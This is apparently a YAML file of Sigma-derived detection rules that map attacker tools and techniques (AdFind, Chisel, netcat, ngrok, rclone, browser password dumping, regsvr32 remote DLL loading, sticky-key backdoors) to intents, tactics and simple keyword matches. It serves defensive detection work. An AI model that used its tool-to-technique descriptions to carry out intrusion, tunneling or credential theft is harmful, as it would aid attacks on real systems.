- id: sigma_455b9d50_15a1_4b99_853f_8d37655a4c1b
  intent: reconnaissance
  tactic: discovery
  description: Detects active directory enumeration activity using known AdFind CLI
    flags
  conditions:
    summary:
      regex_any:
      - suspicious
      - activedirectory
      - enumeration
      - adfind
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_514e7e3e_b3b4_4a67_af60_be20f139198b
  intent: reconnaissance
  tactic: discovery
  description: Detects execution of Adfind.exe utility, which can be used for reconnaissance
    in an Active Directory environment
  conditions:
    summary:
      regex_any:
      - adfind
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9a132afa_654e_11eb_ae93_0242ac130002
  intent: reconnaissance
  tactic: discovery
  description: Detects AdFind execution with common flags seen used during attacks
  conditions:
    summary:
      regex_any:
      - adfind
      - suspicious
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d2b749ee_4225_417e_b20e_a8d2193cbb84
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the execution of AdvancedRun utility
  conditions:
    summary:
      regex_any:
      - advancedrun
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fa00b701_44c6_4679_994d_5a18afa8a707
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the execution of AdvancedRun utility in the context of the
    TrustedInstaller, SYSTEM, Local Service or Network Service accounts
  conditions:
    summary:
      regex_any:
      - advancedrun
      - suspicious
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bef37fa2_f205_4a7b_b484_0759bfd5f86f
  intent: reconnaissance
  tactic: discovery
  description: Detects the use of Advanced IP Scanner. Seems to be a popular tool
    for ransomware groups.
  conditions:
    summary:
      regex_any:
      - advanced
      - scanner
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_54773c5f_f1cc_4703_9126_2f797d96a69d
  intent: reconnaissance
  tactic: discovery
  description: Detects the use of Advanced Port Scanner.
  conditions:
    summary:
      regex_any:
      - advanced
      - port
      - scanner
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8b0e12da_d3c3_49db_bb4f_256703f380e5
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects usage of the Chisel tunneling tool via the commandline arguments
  conditions:
    summary:
      regex_any:
      - chisel
      - tunneling
      - tool
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f44800ac_38ec_471f_936e_3fa7d9c53100
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the use of CleanWipe a tool usually used to delete Symantec
    antivirus.
  conditions:
    summary:
      regex_any:
      - cleanwipe
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2c32b543_1058_4808_91c6_5b31b8bed6c5
  intent: unknown
  tactic: reconnaissance
  description: Detects Crassus, a Windows privilege escalation discovery tool, based
    on PE metadata characteristics.
  conditions:
    summary:
      regex_any:
      - crassus
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d08a2711_ee8b_4323_bdec_b7d85e892b31
  intent: execution
  tactic: execution
  description: Detects the use of the lesser known remote execution tool named CsExec
    a PsExec alternative
  conditions:
    summary:
      regex_any:
      - csexec
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f0ca6c24_3225_47d5_b1f5_352bf07ecfa7
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the use of DefenderCheck, a tool to evaluate the signatures
    used in Microsoft Defender. It can be used to figure out the strings / byte chains
    used in Microsoft Defender to detect a tool and thus used for AV evasion.
  conditions:
    summary:
      regex_any:
      - defendercheck
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d3b70aad_097e_409c_9df2_450f80dc476b
  intent: credential_harvesting
  tactic: credential_access
  description: Detects the use of Ditsnap tool, an inspection tool for Active Directory
    database, ntds.dit.
  conditions:
    summary:
      regex_any:
      - snapshot
      - viewer
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_32410e29_5f94_4568_b6a3_d91a8adad863
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects the use of Fast Reverse Proxy. frp is a fast reverse proxy
    to help you expose a local server behind a NAT or firewall to the Internet.
  conditions:
    summary:
      regex_any:
      - fast
      - reverse
      - proxy
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d7654f02_e04b_4934_9838_65c46f187ebc
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects the use of IOX - a tool for port forwarding and intranet proxy
    purposes
  conditions:
    summary:
      regex_any:
      - tunneling
      - tool
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c9192ad9_75e5_43eb_8647_82a0a5b493e3
  intent: data_staging
  tactic: collection
  description: In Kaspersky's 2020 Incident Response Analyst Report they listed legitimate
    tool "Mouse Lock" as being used for both credential access and collection in security
    incidents.
  conditions:
    summary:
      regex_any:
      - mouse
      - lock
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e31033fc_33f0_4020_9a16_faf9b31cbf08
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects execution of Netcat. Adversaries may use a non-application
    layer protocol for communication between host and C2 server or among infected
    hosts within a network
  conditions:
    summary:
      regex_any:
      - netcat
      - suspicious
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ca387a8e_1c84_4da3_9993_028b45342d30
  intent: reconnaissance
  tactic: discovery
  description: 'Detects usage of SoftPerfect''s "netscan.exe". An application for
    scanning networks.

    It is actively used in-the-wild by threat actors to inspect and understand the
    network architecture of a victim.

    '
  conditions:
    summary:
      regex_any:
      - softperfect
      - netscan
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ee37eb7c_a4e7_4cd5_8fa4_efa27f1c3f31
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects the use of Ngrok, a utility used for port forwarding and tunneling,
    often used by threat actors to make local protected services publicly available.

    Involved domains are bin.equinox.io for download and *.ngrok.io for connections.

    '
  conditions:
    summary:
      regex_any:
      - ngrok
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_74a12f18_505c_4114_8d0b_8448dd5485c6
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects the usage of nimgrab, a tool bundled with the Nim programming
    framework and used for downloading files.
  conditions:
    summary:
      regex_any:
      - nimgrab
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4fd6b1c7_19b8_4488_97f6_00f0924991a3
  intent: reconnaissance
  tactic: discovery
  description: 'Detects usage of NimScan, a portscanner utility.

    In early 2025, adversaries were observed using this utility to scan for open ports
    on remote hosts in a compromised environment.

    This rule identifies the execution of NimScan based on the process image name
    and specific hash values associated with different versions of the tool.

    '
  conditions:
    summary:
      regex_any:
      - nimscan
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4e2ed651_1906_4a59_a78a_18220fca1b22
  intent: unknown
  tactic: s0029
  description: Detects the use of NirCmd tool for command execution, which could be
    the result of legitimate administrative activity
  conditions:
    summary:
      regex_any:
      - nircmd
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d9047477_0359_48c9_b8c7_792cedcdc9c4
  intent: unknown
  tactic: s0029
  description: Detects the use of NirCmd tool for command execution as SYSTEM user
  conditions:
    summary:
      regex_any:
      - nircmd
      - execution
      - local
      - system
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f6ecd1cf_19b8_4488_97f6_00f0924991a3
  intent: reconnaissance
  tactic: discovery
  description: Detects usage of namp/zenmap. Adversaries may attempt to get a listing
    of services running on remote hosts, including those that may be vulnerable to
    remote software exploitation
  conditions:
    summary:
      regex_any:
      - nmap
      - zenmap
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_68d37776_61db_42f5_bf54_27e87072d17e
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects the use of NPS, a port forwarding and intranet penetration
    proxy server
  conditions:
    summary:
      regex_any:
      - tunneling
      - tool
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_771d1eb5_9587_4568_95fb_9ec44153a012
  intent: unknown
  tactic: s0029
  description: Detects the use of NSudo tool for command execution
  conditions:
    summary:
      regex_any:
      - nsudo
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b1cb4ab6_ac31_43f4_adf1_d9d08957419c
  intent: unknown
  tactic: reconnaissance
  description: Detects the execution of PingCastle, a tool designed to quickly assess
    the Active Directory security level.
  conditions:
    summary:
      regex_any:
      - pingcastle
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b37998de_a70b_4f33_b219_ec36bf433dc0
  intent: unknown
  tactic: reconnaissance
  description: 'Detects the execution of PingCastle, a tool designed to quickly assess
    the Active Directory security level via a script located in a potentially suspicious
    or uncommon location.

    '
  conditions:
    summary:
      regex_any:
      - pingcastle
      - execution
      - from
      - potentially
      - suspicious
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_811e0002_b13b_4a15_9d00_a613fce66e42
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: 'Detects the execution of Process Hacker based on binary metadata information
    (Image, Hash, Imphash, etc).

    Process Hacker is a tool to view and manipulate processes, kernel options and
    other low level options.

    Threat actors abused older vulnerable versions to manipulate system processes.

    '
  conditions:
    summary:
      regex_any:
      - process
      - hacker
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5817e76f_4804_41e6_8f1d_5fa0b3ecae2d
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects the execution of Radmin which can be abused by an adversary
    to remotely control Windows machines
  conditions:
    summary:
      regex_any:
      - radmin
      - viewer
      - utility
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0c92f2e6_f08f_4b73_9216_ecb0ca634689
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the use of rcedit to potentially alter executable PE metadata
    properties, which could conceal efforts to rename system utilities for defense
    evasion.
  conditions:
    summary:
      regex_any:
      - potential
      - metadata
      - tamper
      - using
      - rcedit
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e37db05d_d1f9_49c8_b464_cee1a4b11638
  intent: data_exfiltration
  tactic: exfiltration
  description: Detects execution of RClone utility for exfiltration as used by various
    ransomwares strains like REvil, Conti, FiveHands, etc
  conditions:
    summary:
      regex_any:
      - rclone
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6ddff2e8_ea1a_45d0_8938_93dfc1d67ae7
  intent: data_exfiltration
  tactic: exfiltration
  description: 'Detects the execution of the Restic backup tool, which can be used
    for data exfiltration.

    Threat actors may leverage Restic to back up and exfiltrate sensitive data to
    remote storage locations, including cloud services.

    If not legitimately used in the enterprise environment, its presence may indicate
    malicious activity.

    '
  conditions:
    summary:
      regex_any:
      - restic
      - backup
      - tool
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_93199800_b52a_4dec_b762_75212c196542
  intent: unknown
  tactic: s0029
  description: Detects the use of the RunXCmd tool to execute commands with System
    or TrustedInstaller accounts
  conditions:
    summary:
      regex_any:
      - runxcmd
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_38646daa_e78f_4ace_9de0_55547b2d30da
  intent: reconnaissance
  tactic: discovery
  description: Detects the execution of the PUA/Recon tool Seatbelt via PE information
    of command line parameters
  conditions:
    summary:
      regex_any:
      - seatbelt
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5722dff1_4bdd_4949_86ab_fbaf707e767a
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the execution of System Informer, a task manager tool to view
    and manipulate processes, kernel options and other low level operations
  conditions:
    summary:
      regex_any:
      - system
      - informer
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_44030449_b0df_4c94_aae1_502359ab28ee
  intent: credential_harvesting
  tactic: credential_access
  description: 'Detects execution of TruffleHog, a tool used to search for secrets
    in different platforms like Git, Jira, Slack, SharePoint, etc. that could be used
    maliciously.

    While it is a legitimate tool, intended for use in CI pipelines and security assessments,

    It was observed in the Shai-Hulud malware campaign targeting npm packages to steal
    sensitive information.

    '
  conditions:
    summary:
      regex_any:
      - trufflehog
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d0dae994_26c6_4d2d_83b5_b3c8b79ae513
  intent: credential_harvesting
  tactic: credential_access
  description: Detects the execution of WebBrowserPassView.exe. A password recovery
    tool that reveals the passwords stored by the following Web browsers, Internet
    Explorer (Version 4.0 - 11.0), Mozilla Firefox (All Versions), Google Chrome,
    Safari, and Opera
  conditions:
    summary:
      regex_any:
      - webbrowserpassview
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bdeeabc9_ff2a_4a51_be59_bb253aac7891
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects usage of wsudo (Windows Sudo Utility). Which is a tool that
    let the user execute programs with different permissions (System, Trusted Installer,
    Administrator...etc)
  conditions:
    summary:
      regex_any:
      - wsudo
      - suspicious
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_899133d5_4d7c_4a7f_94ee_27355c879d90
  intent: execution
  tactic: execution
  description: Detects execution of python using the "-c" flag. This is could be used
    as a way to launch a reverse shell or execute live python code.
  conditions:
    summary:
      regex_any:
      - python
      - inline
      - command
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_480e7e51_e797_47e3_8d72_ebfce65b6d8d
  intent: execution
  tactic: execution
  description: Detects python spawning a pretty tty
  conditions:
    summary:
      regex_any:
      - python
      - spawning
      - pretty
      - windows
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5fc297ae_25b6_488a_8f25_cc12ac29b744
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects potentially suspicious execution of the Qemu utility in a
    Windows environment.

    Threat actors have leveraged this utility and this technique for achieving network
    access as reported by Kaspersky.

    '
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - usage
      - qemu
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_53ef0cef_fa24_4f25_a34a_6c72dfa2e6e2
  intent: execution
  tactic: execution
  description: Detects usage of "query.exe" a system binary to exfil information such
    as "sessions" and "processes" for later use
  conditions:
    summary:
      regex_any:
      - query
      - usage
      - exfil
      - data
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_faa48cae_6b25_4f00_a094_08947fef582f
  intent: data_staging
  tactic: collection
  description: Detects the use of rar.exe, on the command line, to create an archive
    with password protection or with a specific compression level. This is pretty
    indicative of malicious actions.
  conditions:
    summary:
      regex_any:
      - usage
      - with
      - password
      - compression
      - level
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_afe52666_401e_4a02_b4ff_5d128990b8cb
  intent: execution
  tactic: execution
  description: Detects RAR usage that creates an archive from a suspicious folder,
    either a system folder or one of the folders often used by attackers for staging
    purposes
  conditions:
    summary:
      regex_any:
      - suspicious
      - greedy
      - compression
      - using
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6bba49bf_7f8c_47d6_a1bb_6b4dece4640e
  intent: execution
  tactic: execution
  description: Detects suspicious process related to rasdial.exe
  conditions:
    summary:
      regex_any:
      - suspicious
      - rasdial
      - activity
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_edadb1e5_5919_4e4c_8462_a9e643b02c4b
  intent: credential_harvesting
  tactic: credential_access
  description: Detects the use of the Microsoft Windows Resource Leak Diagnostic tool
    "rdrleakdiag.exe" to dump process memory
  conditions:
    summary:
      regex_any:
      - process
      - memory
      - dump
      - rdrleakdiag
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_db1c21e4_cd66_4b4e_85ca_590f0780529c
  intent: impact_operations
  tactic: impact
  description: 'Detects attempts to disable windows recovery environment using Reagentc.

    ReAgentc.exe is a command-line tool in Windows used to manage the Windows Recovery
    Environment (WinRE).

    It allows users to enable, disable, and configure WinRE, which is used for troubleshooting
    and repairing common boot issues.

    '
  conditions:
    summary:
      regex_any:
      - windows
      - recovery
      - environment
      - disabled
      - reagentc
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e9f8f8cc_07cc_4e81_b724_f387db9175e4
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects potentially suspicious execution of the Regasm/Regsvcs utilities
    with an uncommon extension.
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - execution
      - regasm
      - regsvcs
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cc368ed0_2411_45dc_a222_510ace303cb2
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects potentially suspicious execution of the Regasm/Regsvcs utilities
    from a potentially suspicious location
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - execution
      - regasm
      - regsvcs
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_82880171_b475_4201_b811_e9c826cd5eaa
  intent: reconnaissance
  tactic: discovery
  description: Detects the export of a crital Registry key to a file.
  conditions:
    summary:
      regex_any:
      - exports
      - critical
      - registry
      - keys
      - file
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_73bba97f_a82d_42ce_b315_9182e76c57b1
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the import of the specified file to the registry with regedit.exe.
  conditions:
    summary:
      regex_any:
      - imports
      - registry
      - from
      - file
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0b80ade5_6997_4b1d_99a1_71701778ea61
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the import of a alternate datastream to the registry with regedit.exe.
  conditions:
    summary:
      regex_any:
      - imports
      - registry
      - from
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_883835a7_df45_43e4_bf1d_4268768afda4
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects a regedit started with TrustedInstaller privileges or by ProcessHacker.exe
  conditions:
    summary:
      regex_any:
      - regedit
      - trusted
      - installer
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_77946e79_97f1_45a2_84b4_f37b5c0d8682
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the import of an alternate data stream with regini.exe, regini.exe
    can be used to modify registry keys.
  conditions:
    summary:
      regex_any:
      - suspicious
      - registry
      - modification
      - from
      - regini
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a2910908_e86f_4687_aeba_76a5f996e652
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects using register-cimprovider.exe to execute arbitrary dll file.
  conditions:
    summary:
      regex_any:
      - execution
      - register
      - cimprovider
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_87a476dc_0079_4583_a985_dee7a20a03de
  intent: credential_harvesting
  tactic: credential_access
  description: Detects processes that query known 3rd party registry keys that holds
    credentials via commandline
  conditions:
    summary:
      regex_any:
      - enumeration
      - party
      - creds
      - from
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cc1abf27_78a3_4ac5_a51c_f3070b1d8e40
  intent: credential_harvesting
  tactic: credential_access
  description: 'Detects the use of reg.exe to export registry paths associated with
    third-party credentials.

    Credential stealers have been known to use this technique to extract sensitive
    information from the registry.

    '
  conditions:
    summary:
      regex_any:
      - registry
      - export
      - third
      - party
      - credentials
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_10344bb3_7f65_46c2_b915_2d00d47be5b0
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects changes to Internet Explorer''s (IE / Windows Internet properties)
    ZoneMap configuration of the "HTTP" and "HTTPS" protocols to point to the "My
    Computer" zone. This allows downloaded files from the Internet to be granted the
    same level of trust as files stored locally.

    '
  conditions:
    summary:
      regex_any:
      - zonemap
      - setting
      - downgraded
      - mycomputer
      - zone
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ae215552_081e_44c7_805f_be16f975c8a2
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the registration of a debugger for a program that is available
    in the logon screen (sticky key backdoor).
  conditions:
    summary:
      regex_any:
      - suspicious
      - debugger
      - registration
      - cmdline
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_21d856f9_9281_4ded_9377_51a1a6e2a432
  intent: persistence_installation
  tactic: persistence
  description: Detects the addition of a new LogonScript to the registry value "UserInitMprLogonScript"
    for potential persistence
  conditions:
    summary:
      regex_any:
      - potential
      - persistence
      - logon
      - scripts
      - commandline
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_baef1ec6_2ca9_47a3_97cc_4cf2bda10b77
  intent: credential_harvesting
  tactic: credential_access
  description: Detects when an attacker tries to add a new network provider in order
    to dump clear text credentials, similar to how the NPPSpy tool does it
  conditions:
    summary:
      regex_any:
      - potential
      - credential
      - dumping
      - attempt
      - using
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_023c654f_8f16_44d9_bb2b_00ff36a62af9
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects changes to the registry value "PythonFunctionWarnings" that
    would prevent any warnings or alerts from showing when Python functions are about
    to be executed.

    Threat actors could run malicious code through the new Microsoft Excel feature
    that allows Python to run within the spreadsheet.

    '
  conditions:
    summary:
      regex_any:
      - python
      - function
      - execution
      - security
      - warning
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0f9c21f1_6a73_4b0e_9809_cb562cb8d981
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detect modification of services configuration (ImagePath, FailureCommand
    and ServiceDLL) in registry by processes with Medium integrity level
  conditions:
    summary:
      regex_any:
      - potential
      - privilege
      - escalation
      - service
      - permissions
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2a4b3e61_9d22_4e4a_b60f_6e8f0cde6f25
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects potential abuse of the provisioning registry key for indirect
    command execution through "Provlaunch.exe".
  conditions:
    summary:
      regex_any:
      - potential
      - provisioning
      - registry
      - abuse
      - binary
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cf2e938e_9a3e_4fe8_a347_411642b28a9f
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects changes to the PowerShell execution policy registry key in
    order to bypass signing requirements for script execution from the CommandLine
  conditions:
    summary:
      regex_any:
      - potential
      - powershell
      - execution
      - policy
      - tampering
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9ec9fb1b_e059_4489_9642_f270c207923d
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects changes to the registry key "HKLM\Software\Microsoft\Windows
    NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" where the value is set to
    "0" in order to hide user account from being listed on the logon screen.

    '
  conditions:
    summary:
      regex_any:
      - hiding
      - user
      - account
      - specialaccounts
      - registry
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ec88289a_7e1a_4cc3_8d18_bd1f60e4b9ba
  intent: persistence_installation
  tactic: persistence
  description: Detects modification addition to the 'TypedPaths' key in the user or
    admin registry via the commandline. Which might indicate persistence attempt
  conditions:
    summary:
      regex_any:
      - persistence
      - typedpaths
      - commandline
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b236190c_1c61_41e9_84b3_3fe03f6d76b0
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects a potential command line flag anomaly related to "regsvr32"
    in which the "/i" flag is used without the "/n" which should be uncommon.
  conditions:
    summary:
      regex_any:
      - potential
      - regsvr32
      - commandline
      - flag
      - anomaly
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2dd2c217_bf68_437a_b57c_fe9fd01d5de8
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects regsvr32 execution to download and install DLLs located remotely
    where the address is an IP address.
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - regsvr32
      - http
      - pattern
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_867356ee_9352_41c9_a8f2_1be690d78216
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects regsvr32 execution to download/install/register new DLLs that
    are hosted on Web or FTP servers.
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - regsvr32
      - http
      - pattern
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_88a87a10_384b_4ad7_8871_2f9bf9259ce5
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects REGSVR32.exe to execute DLL hosted on remote shares
  conditions:
    summary:
      regex_any:
      - suspicious
      - regsvr32
      - execution
      - from
      - remote
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6f0947a4_1c5e_4e0d_8ac7_53159b8f23ca
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects potentially suspicious child processes of "regsvr32.exe".
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - child
      - process
      - regsvr32
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9525dc73_0327_438c_8c04_13c0e037e9da
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of regsvr32 where the DLL is located in a potentially
    suspicious location.
  conditions:
    summary:
      regex_any:
      - regsvr32
      - execution
      - from
      - potential
      - suspicious
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_327ff235_94eb_4f06_b9de_aaee571324be
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of regsvr32 where the DLL is located in a highly
    suspicious locations
  conditions:
    summary:
      regex_any:
      - regsvr32
      - execution
      - from
      - highly
      - suspicious
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_089fc3d2_71e8_4763_a8a5_c97fbb0a403e
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the execution of REGSVR32.exe with DLL files masquerading as
    other files
  conditions:
    summary:
      regex_any:
      - regsvr32
      - execution
      - with
      - suspicious
      - file
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ab37a6ec_6068_432b_a64e_2c7bf95b1d22
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects various command line and scripting engines/processes such as
    "PowerShell", "Wscript", "Cmd", etc. spawning a "regsvr32" instance.
  conditions:
    summary:
      regex_any:
      - scripting
      - commandline
      - process
      - spawned
      - regsvr32
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_50919691_7302_437f_8e10_1fe088afa145
  intent: execution
  tactic: execution
  description: Detects a "regsvr32" execution where the DLL doesn't contain a common
    file extension.
  conditions:
    summary:
      regex_any:
      - regsvr32
      - execution
      - with
      - uncommon
      - extension
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_de587dce_915e_4218_aac4_835ca6af6f70
  intent: persistence_installation
  tactic: persistence
  description: Detects suspicious command line reg.exe tool adding key to RUN key
    in Registry
  conditions:
    summary:
      regex_any:
      - potential
      - persistence
      - attempt
      - keys
      - using
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d7662ff6_9e97_4596_a61d_9839e32dee8d
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of "reg.exe" commands with the "add" or "copy" flags
    on safe boot registry keys. Often used by attacker to allow the ransomware to
    work in safe mode as some security products do not
  conditions:
    summary:
      regex_any:
      - safeboot
      - keys
      - utility
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0e0255bf_2548_47b8_9582_c0955c9283f5
  intent: impact_operations
  tactic: impact
  description: Detects suspicious addition to BitLocker related registry keys via
    the reg.exe utility
  conditions:
    summary:
